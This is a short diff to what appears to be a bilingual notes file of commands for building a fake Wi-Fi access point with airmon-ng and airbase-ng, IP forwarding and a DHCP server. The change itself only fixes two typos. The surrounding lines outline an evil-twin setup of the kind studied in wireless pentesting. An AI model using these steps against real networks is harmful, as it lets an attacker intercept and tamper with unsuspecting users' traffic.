@@ -9,7 +9,7 @@
 airmon-ng   				# See available wireless network interfaces to use
 airmon-ng start wlan0  		#  Config wireless interface in mod monitor
 
--------- Creación d eun nuevo screen para crear el AP ---------------------
+-------- Creación de un nuevo screen para crear el AP ---------------------
 screen -S fakeAP 	# Crear el screen
 airbase-ng -c 6 -e "FakeAPname" mon0 [wlan0mon, wlan0]	# Config Fake AP
 Cntrl a d 		# Salir del screen
@@ -28,7 +28,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward 		# If not work 'sudo su' use
 dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0
 
 sudo systemctl start isc-dhcp-server.service
-sudo systemctl staturs isc-dhcp-server.service
+sudo systemctl status isc-dhcp-server.service
 sudo systemctl stop isc-dhcp-server.service
 
 # if failed
